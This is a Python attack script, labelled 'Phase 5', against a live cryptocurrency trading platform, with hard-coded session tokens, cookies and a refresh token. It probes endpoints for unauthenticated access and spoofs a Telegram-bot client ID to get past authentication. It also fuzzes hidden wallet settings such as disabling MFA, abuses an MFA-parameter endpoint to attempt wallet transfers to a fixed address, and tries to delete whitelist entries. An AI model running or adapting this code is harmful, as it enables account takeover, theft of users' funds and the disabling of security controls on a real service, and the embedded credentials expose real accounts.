#!/usr/bin/env python3
"""
PHASE 5 — Unauthenticated attack surface mapping + config discovery.
Goal: Find what can be done WITHOUT a token, and discover all config names.
"""
import json
import requests
import time
from datetime import datetime, timezone

ACCESS_TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL2FjY2VzcyIsImRhdGEiOnsidXNlcl9pZCI6IjAwZGFlODcwLTg0OTAtNGQxOS1iZmMwLTM5Y2U0OWU5MDZiNSIsImNsaWVudF9pZCI6ImdtZ25fd2ViXzIwMjYwNzEzLTIwNDQtYTdjNmJmNCIsImRldmljZV9pZCI6ImRlNjIwYTU3LWQ5OGUtNDI5My1iMDA3LTVkMzE1NDU1ZTIxZCIsImZhdGhlcl9pZCI6IjQ5ZjM2ZDlkLThhNTAtNDJlNi05NTJkLTk2N2EwNWUyMDc4OCIsImZpbmdlcnByaW50IjoidjE1MzI0N2I5ZTBlMTg0ZmJlZDNmYWM3M2YxOWRjYTY4YSIsImFwcCI6ImdtZ24iLCJwbGF0Zm9ybSI6IndlYiJ9LCJleHAiOjE3ODQwNjI1MDQsImlhdCI6MTc4NDA2MDcwNCwiaXNzIjoiZ21nbi5haS9zaWduZXIiLCJqdGkiOiIzY2UzY2NmOS0xZjViLTRlODYtYjU3OS1mZWUzMzdmMjgyM2YiLCJuYmYiOjE3ODQwNjA3MDQsInN1YiI6ImdtZ24uYWkvYWNjZXNzIiwidXNlcl9pZCI6IjAwZGFlODcwLTg0OTAtNGQxOS1iZmMwLTM5Y2U0OWU5MDZiNSIsInZlciI6IjEuMCJ9.WaOebjBm_DeYq3jvoA5kszO7hqbIhzU5ymDBatjDBfGatvZg26IEvA1OgOs-B7OQbyL5fA3JhaZSy817ulE9gw"

BASE = "https://gmgn.ai"
OUR_USER_ID = "00dae870-8490-4d19-bfc0-39ce49e906b5"
OUR_SOL_WALLET = "FzFNsCyNj8mP1pE6WzgHfwV5BJDdF3CXxN2ZmmVX7jg8"
OUR_BSC_WALLET = "0x0a4a0836142fcf94ce100b6d7790c50786ffbcff"

COOKIES = {
    "__cf_bm": "9qa7eXAqqNE3bSIxMZwpppcTOZY3P3xN.FEEMJbhNBA-1783973660.6075041-1.0.1.1-xpP4LEhY807gRqRYG17gELVZ7mRp7mVSjEqwfW1TAi3o.r3e0ELz2XeH_UF7bMbaVLh6sqq3gLWVVuwMeLhnT4JzDtVBTOnmsANgwP0Ocq2q7hH2bL_0726EfGBcn9Ml",
    "_ga": "GA1.1.1499118900.1783283677",
    "_csrf": "4-NQvufozCNXqp4NJtA6IpuwRk812C5t",
    "_did": "c800ab0b7d01aa37bc93aacdcbce271e",
    "_wt": "AWpegY9oS-pwZPEJE_DCiED4eeyVHRTBs5VBiak",
    "sid": "gmgn%7C82f74adfe6d87dce9893a1c416af82e9",
}

H_AUTH = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
}

# NO AUTH headers — testing unauth access
H_NOAUTH = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
}

PARAMS = {
    "device_id": "de620a57-d98e-4293-b007-5d315455e21d",
    "client_id": "gmgn_web_20260713-2044-a7c6bf4",
    "from_app": "gmgn",
    "app_ver": "20260713-2044-a7c6bf4",
    "tz_name": "Asia/Aden",
    "tz_offset": "10800",
    "app_lang": "en-US",
    "os": "web",
}

TG_PARAMS = {
    "device_id": "de620a57-d98e-4293-b007-5d315455e21d",
    "client_id": "gmgn_tg_bot",
    "from_app": "tg",
    "app_ver": "20260713-2044-a7c6bf4",
    "tz_name": "Asia/Aden",
    "tz_offset": "10800",
    "app_lang": "en-US",
    "os": "web",
}

findings = []

def log(sev, cat, ep, detail, data=None):
    findings.append({"severity": sev, "category": cat, "endpoint": ep,
                     "detail": detail, "data": str(data)[:2000] if data else None})
    icons = {"CRITICAL": "💀", "HIGH": "🔥", "MEDIUM": "⚠️", "LOW": "ℹ️"}
    print(f"  {icons.get(sev, '?')} [{sev}] {cat}: {detail}")

# ============================================================================
# PART 1: UNAUTHENTICATED ENDPOINT TESTING
# ============================================================================
print("="*80)
print("🔓 PART 1: UNAUTHENTICATED ATTACK SURFACE")
print("="*80)
print("Testing which endpoints work WITHOUT Bearer token...")

unauth_tests = [
    # Registration/referral
    ("POST", "/defi/quotation/v1/register_wallet",
     {"chain": "sol", "address": "TestWallet123456789012345678901234567890123", 
      "invite_code": "NOAUTH", "referrer": OUR_USER_ID},
     "Register wallet — no auth"),
    
    # Login flow (known to work)
    ("POST", "/account/login_v3",
     {"account": "test_unauth@proton.me", "account_type": "email"},
     "Login init — session creation"),
    
    # Dividend info
    ("POST", "/xapi/v1/bsc/flap/dividend_info",
     {"from_address": "0xb4f701538bf492dacb088d4d932ab105c127f89d"},
     "Dividend info — no auth"),
    
    # Solana claiming
    ("POST", "/xapi/v1/sol/claiming",
     {"chain": "sol", "dex": "pump", "from_address": OUR_SOL_WALLET},
     "Sol claiming — no auth"),
    
    # Cashback claim
    ("POST", "/rebate/api/v1/cashback/claim/apply",
     {"chain": "sol", "address": OUR_SOL_WALLET},
     "Cashback claim — no auth"),
    
    # Search (data disclosure)
    ("GET", "/vas/api/v1/search_v3?q=whale",
     None, "Search — no auth"),
    
    # TG messages
    ("GET", "/vas/api/v1/tg/messages",
     None, "TG messages — no auth"),
    
    # Rankings (wallet enumeration)
    ("GET", "/defi/quotation/v1/rank/sol/swaps/24h?orderby=profit&direction=desc&limit=10",
     None, "Rankings — no auth"),
    
    # Token security
    ("GET", "/defi/quotation/v1/tokens/security?chain=sol&address=DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",
     None, "Token security — no auth"),
    
    # Pubkey
    ("GET", "/account/pubkey",
     None, "RSA pubkey — no auth"),
    
    # IP location
    ("GET", "/account/iploc",
     None, "IP location — no auth"),
    
    # Follow wallet
    ("POST", "/api/v1/follow/follow_wallet",
     {"wallet_addresses": ["0xb4f701538bf492dacb088d4d932ab105c127f89d"], "chain": "bsc"},
     "Follow wallet — no auth"),
    
    # User info
    ("POST", "/account/user_info",
     {}, "User info — no auth"),
    
    # Generate MFA params
    ("POST", "/wallet-api/v1/generate_mfa_params",
     {"usage": "transfer", "biz_params": {"chain": "sol"}},
     "Generate MFA params — no auth"),
    
    # Set configs
    ("POST", "/wallet-api/v1/wallet/set_configs",
     {"Items": [{"Name": "test", "Value": "test"}], "Chain": "sol"},
     "Set configs — no auth"),
    
    # Trading bot order
    ("POST", "/tapi/v1/trading_bot/limit_order/create",
     {"chain": "sol", "wallet_address": OUR_SOL_WALLET},
     "Trading bot — no auth"),
    
    # Fourmeme invite info
    ("POST", "/tapi/v1/fourmeme/invite_info",
     {"chain": "bsc", "from_address": OUR_BSC_WALLET},
     "Fourmeme invite — no auth"),
    
    # X auth start
    ("POST", "/api/v1/x/auth/start",
     {}, "X OAuth start — no auth"),
    
    # Whitelist
    ("GET", "/wallet-api/v1/get_whitelist_address?chain=sol",
     None, "Whitelist — no auth"),
]

for method, path, payload, desc in unauth_tests:
    try:
        url = f"{BASE}{path}" if "?" not in path else f"{BASE}{path}"
        if method == "GET":
            r = requests.get(url, headers=H_NOAUTH, cookies=COOKIES, 
                           params=PARAMS if "?" not in path else None, timeout=10)
        else:
            r = requests.post(url, headers=H_NOAUTH, cookies=COOKIES,
                            params=PARAMS, json=payload, timeout=10)
        
        # Analyze
        is_auth_error = False
        if r.status_code == 401:
            is_auth_error = True
        elif r.status_code == 200:
            try:
                data = r.json()
                code = data.get("code", -1)
                msg = data.get("message", "")
                if code in [-109103, -109901] or "unauthorized" in msg.lower() or "token" in msg.lower():
                    is_auth_error = True
            except:
                pass
        
        if not is_auth_error and r.status_code in [200, 400, 500]:
            status_icon = "✅" if r.status_code == 200 else "⚠️"
            try:
                data = r.json()
                code = data.get("code", "?")
                msg = data.get("message", "")[:80]
                print(f"  {status_icon} NO AUTH NEEDED: {desc}")
                print(f"     → {r.status_code} | code:{code} | {msg}")
                
                if r.status_code == 200 and code == 0:
                    log("CRITICAL", "UNAUTH_ACCESS", path,
                        f"Endpoint works WITHOUT authentication! {desc}", data)
            except:
                print(f"  {status_icon} NO AUTH: {desc} → {r.status_code} ({len(r.text)} bytes)")
                if r.status_code == 200:
                    log("HIGH", "UNAUTH_ACCESS", path,
                        f"Non-JSON 200 without auth: {desc}", r.text[:200])
        else:
            print(f"  🔒 Auth required: {desc} → {r.status_code}")
    
    except Exception as e:
        print(f"  ❌ Error: {desc} → {e}")
    
    time.sleep(0.3)

# ============================================================================
# PART 2: TG BOT SPOOF — EXPANDED UNAUTH SURFACE
# ============================================================================
print("\n" + "="*80)
print("📱 PART 2: TG BOT SPOOF — DOES IT BYPASS AUTH?")
print("="*80)
print("Testing if client_id=gmgn_tg_bot bypasses auth on MORE endpoints...")

tg_tests = [
    ("POST", "/wallet-api/v1/generate_mfa_params",
     {"usage": "transfer", "biz_params": {"chain": "sol"}},
     "MFA params with TG spoof"),
    
    ("POST", "/wallet-api/v1/wallet/set_configs",
     {"Items": [{"Name": "mfa_enabled", "Value": "false"}], "Chain": "sol"},
     "Set configs with TG spoof"),
    
    ("POST", "/tapi/v1/trading_bot/limit_order/create",
     {"chain": "sol", "wallet_address": OUR_SOL_WALLET,
      "base_token": "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",
      "quote_token": "So11111111111111111111111111111111111111112",
      "order_type": "buy", "sub_order_type": "take_profit",
      "amount_in": "100000", "trigger_price": "0.0000001",
      "slippage": 50, "fee": "0.001"},
     "Trading bot with TG spoof"),
    
    ("POST", "/defi/quotation/v1/register_wallet",
     {"chain": "sol", "address": "TGSpoofTest1234567890123456789012345678901",
      "invite_code": "TGSPOOF"},
     "Register wallet with TG spoof"),
    
    ("POST", "/account/user_info",
     {}, "User info with TG spoof"),
    
    ("POST", "/wallet-api/v1/transfer",
     {"FromAddress": OUR_SOL_WALLET, "ToAddress": "test", "AmountTxt": "0.001",
      "Chain": "sol", "Coin": "SOL", "TxnId": "test"},
     "Transfer with TG spoof (should fail but check auth)"),
]

for method, path, payload, desc in tg_tests:
    try:
        if method == "GET":
            r = requests.get(f"{BASE}{path}", headers=H_NOAUTH, cookies=COOKIES,
                           params=TG_PARAMS, timeout=10)
        else:
            r = requests.post(f"{BASE}{path}", headers=H_NOAUTH, cookies=COOKIES,
                            params=TG_PARAMS, json=payload, timeout=10)
        
        is_auth_error = r.status_code == 401
        if r.status_code == 200:
            try:
                data = r.json()
                if data.get("code") in [-109103]:
                    is_auth_error = True
            except:
                pass
        
        if not is_auth_error:
            print(f"  ✅ TG SPOOF WORKS: {desc}")
            print(f"     → {r.status_code} | {r.text[:200]}")
            if r.status_code == 200:
                try:
                    data = r.json()
                    if data.get("code") == 0:
                        log("CRITICAL", "TG_AUTH_BYPASS", path,
                            f"TG spoof bypasses auth! {desc}", data)
                except:
                    pass
        else:
            print(f"  🔒 Still needs auth: {desc}")
    
    except Exception as e:
        print(f"  ❌ {desc}: {e}")
    
    time.sleep(0.3)

# ============================================================================
# PART 3: CONFIG NAME DISCOVERY — FUZZ ALL POSSIBLE CONFIG NAMES
# ============================================================================
print("\n" + "="*80)
print("⚙️ PART 3: CONFIG NAME FUZZING — DISCOVER HIDDEN CONFIGS")
print("="*80)

# We know BSC has hidden ones: custom_consolidate_wallet_open, custom_distribute_wallet_open
# Let's discover more by setting likely names and reading back

config_names_to_try = [
    # Security configs
    "two_factor_enabled", "2fa_enabled", "passkey_required", "password_required",
    "withdrawal_confirmation", "transfer_confirmation", "email_confirm_transfer",
    "ip_whitelist", "device_whitelist", "session_lock",
    
    # Trading configs  
    "max_trade_amount", "min_trade_amount", "daily_limit", "max_slippage",
    "auto_sell", "auto_buy", "stop_loss", "take_profit",
    "trailing_stop", "grid_trading", "dca_enabled",
    
    # Wallet configs
    "consolidate_enabled", "distribute_enabled", "batch_transfer",
    "auto_collect", "sweep_enabled", "dust_collection",
    
    # Fee configs
    "fee_discount", "vip_fee_rate", "referral_fee_share",
    "priority_fee_mode", "gas_multiplier",
    
    # Access configs
    "api_enabled", "api_key", "webhook_url", "callback_url",
    "trading_bot_enabled", "copy_trade_enabled",
    
    # Hidden features
    "beta_features", "internal_mode", "debug_mode", "admin_mode",
    "bypass_limits", "unlimited_trades", "no_cooldown",
]

# Set them all on sol chain
print(f"  Setting {len(config_names_to_try)} potential config names...")
accepted = []
rejected = []

for name in config_names_to_try:
    r = requests.post(f"{BASE}/wallet-api/v1/wallet/set_configs", headers=H_AUTH,
                     cookies=COOKIES, params=PARAMS,
                     json={"Items": [{"Name": name, "Value": "true"}], "Chain": "sol"},
                     timeout=8)
    if r.status_code == 200:
        try:
            data = r.json()
            if data.get("code") == 0:
                accepted.append(name)
            else:
                rejected.append((name, data.get("code"), data.get("message", "")[:50]))
        except:
            pass
    time.sleep(0.2)

print(f"\n  ✅ ACCEPTED ({len(accepted)}):")
for name in accepted:
    print(f"     • {name}")

if rejected:
    print(f"\n  ❌ Rejected ({len(rejected)}):")
    for name, code, msg in rejected[:5]:
        print(f"     • {name} → code:{code} {msg}")

# Now read back ALL configs to see what stuck
print(f"\n  [*] Reading back all configs...")
for chain in ["sol", "bsc", "eth", "tron", "base"]:
    r = requests.get(f"{BASE}/wallet-api/v1/wallet/get_configs", headers=H_AUTH,
                    cookies=COOKIES, params={**PARAMS, "chain": chain}, timeout=10)
    if r.status_code == 200:
        data = r.json()
        items = data.get("data", {}).get("items", {})
        if items:
            print(f"\n  Chain {chain} configs ({len(items)} items):")
            for k, v in sorted(items.items()):
                print(f"     {k}: {v}")
            
            # Log any NEW configs we didn't know about
            known = {"anti_mev", "auto_sign", "fee", "max_gas", "mfa_enabled",
                    "priority_fee", "slippage", "whitelist_enabled", "auto_approve",
                    "gas_price", "custom_consolidate_wallet_open", 
                    "custom_distribute_wallet_open", "show_batch_transfer_in_panel",
                    "show_quick_select_in_panel", "show_quick_select_in_trenches",
                    "show_wallet_in_sidebar"}
            new_configs = set(items.keys()) - known
            if new_configs:
                for nc in new_configs:
                    log("HIGH", "NEW_CONFIG", "/wallet-api/v1/wallet/get_configs",
                        f"New config discovered: {nc}={items[nc]} on {chain}", None)

# ============================================================================
# PART 4: SID COOKIE — CAN WE USE IT AS AUTH?
# ============================================================================
print("\n" + "="*80)
print("🍪 PART 4: SID COOKIE AS AUTH — BYPASS TOKEN REQUIREMENT?")
print("="*80)

# The sid cookie is NOT httpOnly (stealable via XSS)
# Test if ONLY the sid cookie (no Bearer token) grants access

sid_only_cookies = {
    "sid": "gmgn%7C82f74adfe6d87dce9893a1c416af82e9",
    "_csrf": "4-NQvufozCNXqp4NJtA6IpuwRk812C5t",
    "_did": "c800ab0b7d01aa37bc93aacdcbce271e",
}

sid_tests = [
    ("POST", "/account/user_info", {}, "User info with SID only"),
    ("POST", "/wallet-api/v1/generate_mfa_params",
     {"usage": "transfer", "biz_params": {"chain": "sol"}},
     "MFA params with SID only"),
    ("POST", "/wallet-api/v1/wallet/set_configs",
     {"Items": [{"Name": "test_sid", "Value": "true"}], "Chain": "sol"},
     "Set config with SID only"),
    ("GET", "/wallet-api/v1/get_whitelist_address?chain=sol", None,
     "Whitelist with SID only"),
    ("POST", "/tapi/v1/trading_bot/limit_order/create",
     {"chain": "sol", "wallet_address": OUR_SOL_WALLET},
     "Trading bot with SID only"),
]

for method, path, payload, desc in sid_tests:
    try:
        h = {**H_NOAUTH}  # No Bearer token
        if method == "GET":
            r = requests.get(f"{BASE}{path}", headers=h, cookies=sid_only_cookies,
                           params=PARAMS, timeout=10)
        else:
            r = requests.post(f"{BASE}{path}", headers=h, cookies=sid_only_cookies,
                            params=PARAMS, json=payload, timeout=10)
        
        is_auth_error = r.status_code == 401
        if r.status_code == 200:
            try:
                data = r.json()
                if data.get("code") in [-109103]:
                    is_auth_error = True
            except:
                pass
        
        if not is_auth_error and r.status_code == 200:
            print(f"  ✅ SID COOKIE WORKS: {desc}")
            print(f"     → {r.text[:200]}")
            try:
                data = r.json()
                if data.get("code") == 0:
                    log("CRITICAL", "SID_AUTH", path,
                        f"SID cookie alone grants access! No Bearer needed! {desc}", data)
            except:
                pass
        else:
            print(f"  🔒 SID alone not enough: {desc} → {r.status_code}")
    except Exception as e:
        print(f"  ❌ {desc}: {e}")
    time.sleep(0.3)

# ============================================================================
# PART 5: REFRESH TOKEN WITHOUT AUTH HEADER
# ============================================================================
print("\n" + "="*80)
print("🔄 PART 5: TOKEN REFRESH — MINIMAL AUTH REQUIREMENTS")
print("="*80)

# What's the MINIMUM needed to refresh? Just the refresh_token body?
# The refresh_token from exploit_with_cookies.py:
REFRESH_TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiI4YTRjM2Q2My04OGZhLTQ2Y2MtOTg0YS1lODg1ZDRhZmQxYjUiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxMC0xOTcyLTlmNDljOGYiLCJkZXZpY2VfaWQiOiJhY2Y4OThjNy01MDYzLTRkMGYtYjk5Mi1kMWU1ZDU2ODQwOWUiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxZjE2MDg1ODljZmQ1N2I5NTA0MzQ1YWE4MmRjZWE0MTIiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2MzI1ODI5LCJpYXQiOjE3ODM3MzM4MjksImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiZTNkODVmNTktYzEwNS00MDQzLWEwNjAtOWE2ZjEwZTc5ZWY3IiwibmJmIjoxNzgzNzMzODI5LCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiOGE0YzNkNjMtODhmYS00NmNjLTk4NGEtZTg4NWQ0YWZkMWI1IiwidmVyIjoiMS4wIn0.T-souQasgFY_CMVReqltxNdrYqa0qPOozLdbvc95nO7WgrAyn-bNhBXayi50IRvYG2kX5kmd3-wHEwY8jSqWag"

refresh_tests = [
    # Just body, no auth header, no cookies
    ("Bare minimum (body only)", H_NOAUTH, {}, {"refresh_token": REFRESH_TOKEN}),
    # With cookies but no auth
    ("With cookies, no auth", H_NOAUTH, COOKIES, {"refresh_token": REFRESH_TOKEN}),
    # With SID only
    ("With SID only", H_NOAUTH, sid_only_cookies, {"refresh_token": REFRESH_TOKEN}),
    # TG spoof
    ("TG spoof + body", H_NOAUTH, {}, {"refresh_token": REFRESH_TOKEN}),
]

for desc, headers, cookies, payload in refresh_tests:
    try:
        params = TG_PARAMS if "TG" in desc else PARAMS
        r = requests.post(f"{BASE}/account/account/refresh_access_token",
                         headers=headers, cookies=cookies, params=params,
                         json=payload, timeout=10)
        
        if r.status_code == 200:
            data = r.json()
            if data.get("code") == 0:
                print(f"  ✅ REFRESH WORKS: {desc}")
                print(f"     → New token: {json.dumps(data)[:200]}")
                log("CRITICAL", "UNAUTH_REFRESH", "/account/account/refresh_access_token",
                    f"Token refresh works with minimal auth: {desc}", data)
            else:
                print(f"  ❌ {desc}: code:{data.get('code')} {data.get('message', '')[:80]}")
        else:
            print(f"  ❌ {desc}: HTTP {r.status_code}")
    except Exception as e:
        print(f"  ❌ {desc}: {e}")

# ============================================================================
# PART 6: WALLET CREATION WITHOUT FULL AUTH
# ============================================================================
print("\n" + "="*80)
print("🏗️ PART 6: WALLET CREATION PATHS")
print("="*80)

# Test wallet creation with various auth levels
wallet_create_tests = [
    # With our token (should work — confirmed before)
    ("Full auth", H_AUTH, COOKIES, PARAMS),
    # TG spoof (might bypass)
    ("TG spoof + auth", H_AUTH, COOKIES, TG_PARAMS),
]

for desc, headers, cookies, params in wallet_create_tests:
    r = requests.post(f"{BASE}/tapi/v1/wallet/create",
                     headers=headers, cookies=cookies, params=params,
                     json={"chain": "sol"}, timeout=10)
    print(f"  Wallet create ({desc}): {r.status_code} → {r.text[:300]}")
    if r.status_code == 200:
        data = r.json()
        if data.get("code") == 0:
            addr = data.get("data", {}).get("address", "")
            log("HIGH", "WALLET_CREATED", "/tapi/v1/wallet/create",
                f"New wallet created ({desc}): {addr}", data)

# ============================================================================
# PART 7: TRANSFER ENDPOINT — FIELD STRUCTURE DEEP PROBE
# ============================================================================
print("\n" + "="*80)
print("💸 PART 7: TRANSFER — FULL FIELD ANALYSIS")
print("="*80)

# Generate fresh txn_id (MFA bypass confirmed)
r = requests.post(f"{BASE}/wallet-api/v1/generate_mfa_params", headers=H_AUTH,
                 cookies=COOKIES, params=PARAMS, json={
                     "usage": "transfer",
                     "biz_params": {
                         "chain": "sol",
                         "from_address": OUR_SOL_WALLET,
                         "to_address": "3vhHN7svfY9dcmicS9BEaBYQGrHTGgh5ox3C3SbyHsCr",
                         "amount": "1000",
                         "amount_txt": "0.000001",
                         "token_address": "So11111111111111111111111111111111111111112",
                         "symbol": "SOL"
                     }
                 }, timeout=10)

if r.status_code == 200:
    data = r.json()
    txn_id = data.get("data", {}).get("txn_id", "")
    vi = data.get("data", {}).get("verify_items", [])
    print(f"  txn_id: {txn_id}")
    print(f"  verify_items: {vi}")
    
    if txn_id and not vi:
        print(f"  🔓 MFA BYPASSED — testing transfer field variations...")
        
        # Try different field name formats to find what works
        transfer_variations = [
            # PascalCase (from validation error earlier)
            {
                "TxnId": txn_id,
                "FromAddress": OUR_SOL_WALLET,
                "ToAddress": "3vhHN7svfY9dcmicS9BEaBYQGrHTGgh5ox3C3SbyHsCr",
                "AmountTxt": "0.000001",
                "Chain": "sol",
                "Coin": "SOL",
                "TokenAddress": "So11111111111111111111111111111111111111112",
            },
            # snake_case
            {
                "txn_id": txn_id,
                "from_address": OUR_SOL_WALLET,
                "to_address": "3vhHN7svfY9dcmicS9BEaBYQGrHTGgh5ox3C3SbyHsCr",
                "amount_txt": "0.000001",
                "chain": "sol",
                "coin": "SOL",
                "token_address": "So11111111111111111111111111111111111111112",
            },
            # Mixed (what the validation error revealed: TxnId, AmountTxt PascalCase)
            {
                "TxnId": txn_id,
                "from_address": OUR_SOL_WALLET,
                "to_address": "3vhHN7svfY9dcmicS9BEaBYQGrHTGgh5ox3C3SbyHsCr",
                "AmountTxt": "0.000001",
                "chain": "sol",
                "coin": "SOL",
            },
        ]
        
        for i, payload in enumerate(transfer_variations):
            r2 = requests.post(f"{BASE}/wallet-api/v1/transfer", headers=H_AUTH,
                             cookies=COOKIES, params=PARAMS, json=payload, timeout=12)
            print(f"\n  Transfer variation {i+1}: {r2.status_code}")
            print(f"     → {r2.text[:300]}")
            
            if r2.status_code == 200:
                try:
                    t_data = r2.json()
                    code = t_data.get("code", -1)
                    msg = t_data.get("message", "")
                    
                    if code == 0:
                        log("CRITICAL", "TRANSFER_SUCCESS", "/wallet-api/v1/transfer",
                            f"TRANSFER ENDPOINT RESPONDED WITH SUCCESS!", t_data)
                    elif "balance" in msg.lower() or "insufficient" in msg.lower():
                        log("CRITICAL", "TRANSFER_REACHED_BALANCE", "/wallet-api/v1/transfer",
                            f"Transfer reached BALANCE CHECK (auth passed!): {msg}", t_data)
                    else:
                        print(f"     App error: code={code} msg={msg}")
                except:
                    pass

# ============================================================================
# PART 8: ADDITIONAL TRANSFER-ADJACENT ENDPOINTS
# ============================================================================
print("\n" + "="*80)
print("💸 PART 8: TRANSFER-ADJACENT ENDPOINTS")
print("="*80)

# batch_query_order with correct field names (PascalCase from errors)
r = requests.post(f"{BASE}/wallet-api/v1/batch_query_order", headers=H_AUTH,
                 cookies=COOKIES, params=PARAMS,
                 json={"Chain": "sol", "OrderIdList": ["test-order-id"]}, timeout=10)
print(f"  batch_query_order (PascalCase): {r.status_code} → {r.text[:200]}")

# Try delete_address with proper nested structure
# Error was: Key: 'AddressId' + Key: 'TxnId' 
# But set_whitelist was: AddAddressReq.VerificationReq.TxnId
# So delete might need: DeleteAddressReq.TxnId or similar

if txn_id:
    delete_attempts = [
        {"AddressId": "77af5622-ad85-4809-86e9-f99b198805e2", "TxnId": txn_id},
        {"address_id": "77af5622-ad85-4809-86e9-f99b198805e2", "txn_id": txn_id},
    ]
    
    for i, payload in enumerate(delete_attempts):
        r = requests.post(f"{BASE}/wallet-api/v1/delete_address", headers=H_AUTH,
                         cookies=COOKIES, params=PARAMS, json=payload, timeout=10)
        print(f"  delete_address {i+1}: {r.status_code} → {r.text[:200]}")
        if r.status_code == 200 and r.json().get("code") == 0:
            log("CRITICAL", "WHITELIST_DELETE", "/wallet-api/v1/delete_address",
                "Whitelist entry DELETED with transfer txn_id!", r.json())

# ============================================================================
# RESULTS
# ============================================================================
print("\n" + "="*80)
print(f"📊 PHASE 5 COMPLETE — {len(findings)} findings")
print("="*80)

for i, f in enumerate(findings, 1):
    icons = {"CRITICAL": "💀", "HIGH": "🔥", "MEDIUM": "⚠️", "LOW": "ℹ️"}
    print(f"\n  [{i}] {icons.get(f['severity'], '?')} {f['severity']} | {f['category']}")
    print(f"      Endpoint: {f['endpoint']}")
    print(f"      Detail: {f['detail']}")

with open("/projects/sandbox/gmg/PHASE5_RESULTS.json", "w") as fp:
    json.dump({"timestamp": datetime.now(timezone.utc).isoformat(), "findings": findings,
              "accepted_configs": accepted}, fp, indent=2)

print(f"\n✅ Saved to PHASE5_RESULTS.json")
